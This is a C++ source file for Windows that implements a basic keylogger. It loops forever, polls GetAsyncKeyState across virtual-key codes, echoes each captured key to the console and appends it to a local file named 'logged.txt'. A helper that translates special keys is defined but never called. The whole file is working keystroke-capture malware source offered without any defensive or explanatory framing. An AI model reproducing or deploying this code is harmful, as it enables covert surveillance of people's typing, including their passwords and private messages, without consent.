#include <windows.h>
#include <iostream>
#include <fstream>

#define FILE_NAME "logged.txt"

void fileData(std::string data) {
    std::fstream log_file;
    //Create the file initially. If the file already exists, append to it instead of erasing.
    log_file.open(FILE_NAME, std::ios::app);
    //put keystrokes into text file
    log_file << data;
    //Close the file
    log_file.close();
}

std::string specialKey(int keyPressed) {
    std::string translatedKey;
    //Space
    if(keyPressed == VK_SPACE) {
        translatedKey = " ";
    //Enter
    } else if(keyPressed == VK_RETURN){
        translatedKey = "\n";
    //Tab
    } else if(keyPressed == VK_TAB) {
        translatedKey = "   ";
    //Caps Lock
    } else if(keyPressed == VK_CAPITAL) {
        translatedKey = "[CAPS]";
    //Back Space
    } else if(keyPressed == VK_BACK) {
        translatedKey = "\b";
    //Shift
    } else if(keyPressed == VK_SHIFT) {
        translatedKey = "[SHIFT]";
    //Control
    } else if(keyPressed == VK_CONTROL) {
        translatedKey = "[CTRL]";
    //Alt
    } else if(keyPressed == VK_MENU) {
        translatedKey = "[ALT]";
    };

    return translatedKey;
}


int main() {
    bool isSpecial;
    //loop forever
    while(true){
        //Loop through each key using Virtual-Key Codes.
        //Start at 8 and go to 190 since the rest of the key codes can vary
        for(int keyCode=8; keyCode<=190; keyCode++) {
            //Check if the key is pressed
            //-32767 specifically so it checks if the least significant bit is set, indicating key was pressed after the call.
            if(GetAsyncKeyState(keyCode) == -32767) {
                //If its a special key, translate it
                std::cout << char(keyCode) << std::endl;
                //Fills the string with 1 of the character array.
                fileData(std::string(1, char(keyCode)));
            }
            
        }
    }
    
    return 1;
}